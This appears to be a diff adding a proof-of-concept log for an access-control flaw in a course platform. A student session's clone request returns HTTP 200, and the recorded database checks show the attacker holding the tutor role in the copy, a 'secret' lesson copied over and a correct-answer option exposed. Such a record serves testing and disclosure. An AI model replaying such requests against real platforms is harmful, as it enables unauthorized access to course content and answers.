@@ -1,0 +1,10 @@
+POST /course/af357990-0a59-45c4-b14a-918ed3ef6153/clone (STUDENT session)
+HTTP 200
+
+{"success":true,"course":{"title":"Stolen t_0f9b5d71","description":"seed Victim Course X_0517b0dd","overview":"Welcome to this amazing course 🚀 ","id":"fdf9146d-6431-4241-b404-232d3e85b374","createdAt":"2026-09-27 14:49:07.256619+00","updatedAt":"2026-09-27 14:49:07.256619+00","groupId":"16a4a1c8-d407-4b74-ac04-61ff99ac2311","isTemplate":true,"logo":"","slug":"stolen-s_29bde6bb","metadata":{"goals":"","description":"","requirements":""},"cost":0,"currency":"USD","bannerImage":null,"isPublished":false,"displayOrder":null,"certificate":{},"compliance":null,"status":"ACTIVE","type":"SELF_PACED","callout":null}}
+
+-- DB side effects on the CLONE --
+new course id = fdf9146d-6431-4241-b404-232d3e85b374  group = 16a4a1c8-d407-4b74-ac04-61ff99ac2311
+attacker role_id in clone group = 2 (2=TUTOR)
+cloned source lesson 'SECRET-LESSON-L_c89ce681' count = 1
+cloned correct-answer option 'CORRECT-ANSWER-ans_aa8d1f85' is_correct = t
